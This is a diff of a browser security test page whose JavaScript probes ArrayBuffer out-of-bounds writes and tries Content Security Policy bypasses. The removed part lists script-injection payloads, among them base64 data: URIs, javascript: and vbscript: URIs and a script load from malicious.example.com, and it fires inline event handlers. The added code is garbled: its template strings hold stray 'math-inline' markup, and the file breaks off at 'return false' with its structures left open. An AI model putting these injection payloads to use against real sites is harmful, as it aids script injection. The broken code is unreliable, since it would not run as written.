@@ -29,11 +29,11 @@
 
     <div>
         <select id="testSelector">
-            <option value="all_enhanced_aggressive">Run All Enhanced Aggressive Tests</option>
-            <option value="oob_write_enhanced">Enhanced ArrayBuffer OOB Write Investigation</option>
-            <option value="csp_bypass_enhanced">Enhanced CSP Bypass Attempts</option>
+            <option value="all_aggressive">Run All Aggressive Tests</option>
+            <option value="oob_write_aggressive">Aggressive ArrayBuffer OOB Write Investigation</option>
+            <option value="csp_bypass_aggressive">Aggressive CSP Bypass Attempts</option>
         </select>
-        <button onclick="runSelectedTest()">Run Selected Test (Enhanced)</button>
+        <button onclick="runSelectedTest()">Run Selected Test (Aggressive)</button>
         <button onclick="clearLog()">Clear Log</button>
     </div>
 
@@ -41,21 +41,37 @@
 
 <script>
 // ======================
-// Helper Functions (unchanged)
+// Collect Browser Information (mantido como estava)
 // ======================
 document.addEventListener('DOMContentLoaded', function() {
     const userAgentElement = document.getElementById('userAgent');
     const platformElement = document.getElementById('platform');
-    try { if (userAgentElement) userAgentElement.textContent = navigator.userAgent; } catch (e) { console.error("Error getting userAgent:", e); if (userAgentElement) userAgentElement.textContent = "N/A"; }
-    try { if (platformElement) platformElement.textContent = navigator.platform; } catch (e) { console.error("Error getting platform:", e); if (platformElement) platformElement.textContent = "N/A"; }
+
+    try {
+        if (userAgentElement) userAgentElement.textContent = navigator.userAgent;
+    } catch (e) {
+        console.error("Error getting userAgent:", e);
+        if (userAgentElement) userAgentElement.textContent = "N/A";
+    }
+    try {
+        if (platformElement) platformElement.textContent = navigator.platform;
+    } catch (e) {
+        console.error("Error getting platform:", e);
+        if (platformElement) platformElement.textContent = "N/A";
+    }
 });
 
+// ======================
+// Logging Function (mantido como estava)
+// ======================
 function log(message, type = '') {
     const logDiv = document.getElementById('log');
     if (logDiv) {
         const line = document.createElement('div');
         line.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-        if (type) line.className = type;
+        if (type) {
+            line.className = type;
+        }
         logDiv.appendChild(line);
         logDiv.scrollTop = logDiv.scrollHeight;
     } else {
@@ -71,143 +87,48 @@ function clearLog() {
 }
 
 // ======================
-// Enhanced Aggressive OOB Write Tests
+// Aggressive POC Tests (MODIFICADO)
 // ======================
-const enhancedOOBWriteTests = async function() {
-    log("[EXPLOIT] Enhanced Aggressive ArrayBuffer OOB Write Investigation...", "info");
-    try {
-        const bufferSize = 64; // Increased buffer size
-        const buffer = new ArrayBuffer(bufferSize);
-        const view = new Uint8Array(buffer);
-        const writeValues = [0xEE, 0x00, 0xFF, 0x7F]; // More write values
-        const offsets = [-15, -5, 0, bufferSize - 10, bufferSize - 1, bufferSize, bufferSize + 5, bufferSize + 15];
-        const readOffsets = [-10, -1, 0, 10, bufferSize - 15, bufferSize - 5, bufferSize - 1, bufferSize, bufferSize + 10];
-
-        for (const writeValue of writeValues) {
-            for (const writeOffset of offsets) {
-                log(`[OOB-AGG+] Attempting to write 0x${writeValue.toString(16).padStart(2, '0')} at offset ${writeOffset}...`, "info");
-                try {
-                    view[writeOffset] = writeValue;
-                    log(`⚠️ OOB write at offset ${writeOffset} with value 0x${writeValue.toString(16).padStart(2, '0')} successful.`, "warning");
-                    for (const readOffset of readOffsets) {
-                        try {
-                            const readValue = view[readOffset];
-                            log(`[OOB-AGG+] Read 0x${readValue.toString(16).padStart(2, '0')} at offset ${readOffset} after write at ${writeOffset}.`, "info");
-                            if (readOffset >= 0 && readOffset < bufferSize && readValue === writeValue && writeOffset >= bufferSize) {
-                                log(`<span class="poc-potential defense-bypass privilege-escalation">🚩 [OOB+] Potential Corruption (Write:${writeOffset}, Read:${readOffset}, Val:0x${readValue.toString(16).padStart(2, '0')})</span>`, "danger");
-                            } else if (readOffset >= 0 && readOffset < bufferSize && readValue === writeValue && writeOffset < 0) {
-                                log(`<span class="poc-potential defense-bypass privilege-escalation">🚩 [OOB+] Potential Corruption (Neg. Write:${writeOffset}, Read:${readOffset}, Val:0x${readValue.toString(16).padStart(2, '0')})</span>`, "danger");
-                            }
-                        } catch (readError) {
-                            log(`✅ Error reading at offset ${readOffset}: ${readError.message}`, "success");
-                        }
-                    }
-                } catch (writeError) {
-                    log(`✅ OOB write at offset ${writeOffset} error: ${writeError.message}`, "success");
-                }
-                await new Promise(resolve => setTimeout(resolve, 300));
-            }
-        }
-        log("[OOB-AGG+] Completed enhanced OOB write testing.", "info");
-    } catch (e) {
-        log(`❌ Test error: ${e.message}`, "danger");
-    }
-    return true;
-};
-
-// ======================
-// Enhanced Aggressive CSP Bypass Tests
-// ======================
-const enhancedCSPBypassTests = async function() {
-    log("[PRIV-ESC] Enhanced Aggressive CSP Bypass Attempts...", "info");
-    const scriptSources = [
-        'data:text/javascript;base64,YWxlcnQoImNzcCBiYXlwYXNzIik7',
-        'data:application/javascript;base64,YWxlcnQoImNzcCBiYXlwYXNzIik7',
-        'http://malicious.example.com/script.js',
-        'https://malicious.example.com/script.js',
-        '//malicious.example.com/script.js',
-        'blob:null/someBlob',
-        'javascript:alert("csp bypass")',
-        'vbscript:msgbox("csp bypass")',
-        'data:text/html,<script>alert("csp bypass")</script>', // Injecting HTML with script
-    ];
-
-    const eventAttributes = ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onblur', 'onchange']; // More event attributes
-
-    for (const src of scriptSources) {
-        log(`[CSP-AGG+] Attempting script injection with src: ${src}`, "info");
+const aggressiveTests = {
+    "oob_write_aggressive": async function() {
+        log("[EXPLOIT] Enhanced Aggressive ArrayBuffer OOB Write Investigation...", "info");
         try {
-            const script = document.createElement('script');
-            script.src = src;
-            document.body.appendChild(script);
-            script.onerror = () => { log(`⚠️ [CSP+] Script load error (potential CSP block) for: ${src}`, "warning"); document.body.removeChild(script); };
-            script.onload = () => { log(`<span class="poc-potential defense-bypass privilege-escalation">🚩 [CSP+] Bypass Possible: Script loaded from ${src}</span>`, "danger"); document.body.removeChild(script); };
-            await new Promise(resolve => setTimeout(resolve, 1000));
+            const bufferSize = 32;
+            const buffer = new ArrayBuffer(bufferSize);
+            const view = new Uint8Array(buffer);
+            const writeValues = [0xEE, 0x00, 0xFF]; // Mais valores para escrita
+            const offsets = [-15, -10, -5, -1, 0, 1, 5, 10, bufferSize - 10, bufferSize - 5, bufferSize - 1, bufferSize, bufferSize + 5, bufferSize + 10, bufferSize + 15]; // Mais offsets
+            const readOffsets = [-7, -3, 0, 3, 7, bufferSize - 7, bufferSize - 3, bufferSize, bufferSize + 3, bufferSize + 7];
+
+            for (const writeValue of writeValues) {
+                for (const writeOffset of offsets) {
+                    log(`[OOB-AGG+] Attempting to write 0x${writeValue.toString(16).padStart(2, '0')} at offset ${writeOffset}...`, "info");
+                    try {
+                        view[writeOffset] = writeValue;
+                        log(`⚠️ [OOB+] OOB write at offset <span class="math-inline">\{writeOffset\} \(value 0x</span>{writeValue.toString(16).padStart(2, '0')}) successful.`, "warning");
+                        for (const readOffset of readOffsets) {
+                            try {
+                                const readValue = view[readOffset];
+                                log(`[OOB-AGG+] Read 0x${readValue.toString(16).padStart(2, '0')} at offset ${readOffset} after write at ${writeOffset}.`, "info");
+                                if (readOffset >= 0 && readOffset < bufferSize && readValue === writeValue && writeOffset >= bufferSize) {
+                                    log(`<span class="poc-potential defense-bypass privilege-escalation">🚩 [OOB+] Potential Corruption (Write:<span class="math-inline">\{writeOffset\}, Read\:</span>{readOffset}, Val:0x${readValue.toString(16).padStart(2, '0')})</span>`, "danger");
+                                } else if (readOffset >= 0 && readOffset < bufferSize && readValue === writeValue && writeOffset < 0) {
+                                    log(`<span class="poc-potential defense-bypass privilege-escalation">🚩 [OOB+] Potential Corruption (Neg. Write:<span class="math-inline">\{writeOffset\}, Read\:</span>{readOffset}, Val:0x${readValue.toString(16).padStart(2, '0')})</span>`, "danger");
+                                }
+                            } catch (readError) {
+                                log(`✅ Error reading at offset ${readOffset}: ${readError.message}`, "success");
+                            }
+                        }
+                    } catch (writeError) {
+                        log(`✅ OOB write at offset ${writeOffset} error: ${writeError.message}`, "success");
+                    }
+                    await new Promise(resolve => setTimeout(resolve, 300));
+                }
+            }
+
+            log("[OOB-AGG+] Completed enhanced OOB write testing.", "info");
+
         } catch (e) {
-            log(`❌ Error injecting script with src ${src}: ${e.message}`, "danger");
+            log(`❌ Test error: ${e.message}`, "danger");
         }
-    }
-
-    for (const attr of eventAttributes) {
-        const inlineCode = 'window.enhancedCSPBypass = true;';
-        const elementWithEvent = document.createElement('div');
-        elementWithEvent.setAttribute(attr, inlineCode);
-        document.body.appendChild(elementWithEvent);
-        // Triggering events (simplified)
-        if (attr === 'onerror') { const img = document.createElement('img'); img.src = 'invalid-image.jpg'; img.onerror = new Function(inlineCode); document.body.appendChild(img); document.body.removeChild(img); }
-        else if (attr === 'onload' && elementWithEvent.tagName === 'img') elementWithEvent.src = 'valid-image.png';
-        else if (attr === 'onclick') elementWithEvent.click();
-        else if (attr === 'onmouseover') elementWithEvent.dispatchEvent(new MouseEvent('mouseover'));
-        else if (attr === 'onfocus') elementWithEvent.focus();
-        else if (attr === 'onblur') elementWithEvent.blur();
-        else if (attr === 'onchange') { const input = document.createElement('input'); input.setAttribute('onchange', inlineCode); document.body.appendChild(input); input.value = 'test'; input.dispatchEvent(new Event('change')); document.body.removeChild(input); }
-
-        if (window.enhancedCSPBypass === true) {
-            log(`<span class="poc-potential defense-bypass privilege-escalation">🚩 [CSP+] Bypass Possible: Inline script via ${attr}</span>`, "danger");
-            window.enhancedCSPBypass = false;
-        }
-        document.body.removeChild(elementWithEvent);
-        await new Promise(resolve => setTimeout(resolve, 500));
-    }
-
-    log("[CSP-AGG+] Completed enhanced CSP bypass testing.", "info");
-    return true;
-};
-
-// ======================
-// Enhanced Test Runner
-// ======================
-async function runSelectedTest() {
-    const testSelector = document.getElementById('testSelector');
-    const selectedTest = testSelector.value;
-
-    clearLog();
-    log("=== Starting Enhanced Aggressive Tests ===", "section");
-
-    if (selectedTest === "all_enhanced_aggressive") {
-        await enhancedOOBWriteTests();
-        await new Promise(resolve => setTimeout(resolve, 5000));
-        await enhancedCSPBypassTests();
-        log("\n=== All Enhanced Aggressive Tests Completed. Review logs and browser behavior thoroughly. ===", "section");
-    } else if (selectedTest === "oob_write_enhanced") {
-        await enhancedOOBWriteTests();
-        log("\n=== Enhanced OOB Write Test Completed. Review logs and browser behavior closely. ===", "section");
-    } else if (selectedTest === "csp_bypass_enhanced") {
-        await enhancedCSPBypassTests();
-        log("\n=== Enhanced CSP Bypass Test Completed. Review logs and browser behavior closely. ===", "section");
-    } else {
-        log(`Error: Enhanced Aggressive Test "${selectedTest}" not found.`, "danger");
-    }
-
-    log("\nEnhanced aggressive impact demonstration tests completed.", "info");
-}
-
-function clearLog() {
-    const logDiv = document.getElementById('log');
-    if (logDiv) {
-        logDiv.innerHTML = '';
-    }
-}
-</script>
-</body>
-</html>
+        return false
